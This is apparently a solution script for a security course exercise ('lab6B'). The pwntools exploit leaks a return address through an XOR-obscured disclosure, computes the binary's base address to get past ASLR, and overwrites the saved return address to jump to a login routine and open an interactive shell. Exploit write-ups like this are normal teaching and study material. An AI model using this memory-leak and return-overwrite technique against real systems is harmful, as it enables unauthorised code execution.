from pwn import *

OFFSET_LOGIN = 0xaf4
OFFSET_RET = 0xf7e


def whereislogin(p):

    payload = "A" * 0x20 
    p.sendline(payload)
    payload = "B" * 0x20
    p.sendline(payload)

    p.recvuntil("Authentication failed for user ")
    rcvd = p.recvline()

    ret = u32(xor(rcvd[0x54:0x58], xor("B", "A"))) # Return address
    log.success("Leaked return addr: " + hex(ret))
    base = ret - OFFSET_RET
    log.success("Base addr: " + hex(base))
    pos_login = base + OFFSET_LOGIN
    log.info("Login should be at: " + hex(pos_login))

    return pos_login, ret

def get_shell(p, pos_login, ret):

    payload = "A" * 0x20
    p.sendline(payload)
    payload = ""
    payload += "B"* 20
    # much elegant, so well understood, wow
    payload +=  p32 ( ( ( ret ^ 0x03030303 ) ^ 0x42424242 ) ^ ( pos_login ^ 0x03030303 ) )
    payload += "B" * 8
    p.sendline(payload)


if args['LOCAL']:
    p = process("./lab6B")
else:
    p = remote("ip", 6642)

pos_login,ret  = whereislogin(p)
get_shell(p, pos_login, ret)

p.interactive()
